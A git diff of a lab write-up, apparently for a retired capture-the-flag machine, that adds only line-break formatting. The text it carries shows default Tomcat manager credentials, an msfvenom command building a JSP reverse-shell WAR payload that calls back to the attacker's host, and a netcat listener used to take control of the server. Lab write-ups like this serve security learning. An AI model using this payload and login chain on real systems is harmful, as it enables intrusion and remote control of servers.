@@ -11,8 +11,8 @@ tags:
  - Owned
 ---
 
--Installed AutoRecon at the advisement of the guys in the TryHackMe Discord.  
--Ran AutoRecon against target host 10.10.10.95
+-Installed AutoRecon at the advisement of the guys in the TryHackMe Discord.  <br>
+-Ran AutoRecon against target host 10.10.10.95<br>
 
 Gobuster:
 {% highlight ruby %}
@@ -84,22 +84,22 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Sat Jan 23 21:35:40 2021 -- 1 IP address (1 host up) scanned in 115.20 seconds
 {% endhighlight %}
 
--Visited webserver in browser
--Checked Manager App at /manager/html
--Is a login page
--Looked up and tried default tomcat::s3cret creds
+-Visited webserver in browser<br>
+-Checked Manager App at /manager/html<br>
+-Is a login page<br>
+-Looked up and tried default tomcat::s3cret creds<br>
 -Logged in, successfully
--Generated msfvenom payload with 
+<br>-Generated msfvenom payload with 
 {% highlight ruby %}
 sudo msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.xx LPORT=4445 -f war > reverse.war  
 {% endhighlight %}
--uploaded via Browse & Upload buttons
--started local netcat shell as 
+<br>-uploaded via Browse & Upload buttons
+<br>-started local netcat shell as 
 {% highlight ruby %}
 nc -nlvp 4445
 {% endhighlight %}
--clicked link in server
--payload reached back out to netcat shell
--cd'ed to C:\Users\Administrator\Desktop via cli and read flag
+<br>-clicked link in server
+<br>-payload reached back out to netcat shell
+<br>-cd'ed to C:\Users\Administrator\Desktop via cli and read flag
 
-Overall this machine was a bit boring, but it's a retired machine and was randomly selected based on being an Easy rating, so there you go.  
+<br>Overall this machine was a bit boring, but it's a retired machine and was randomly selected based on being an Easy rating, so there you go.  
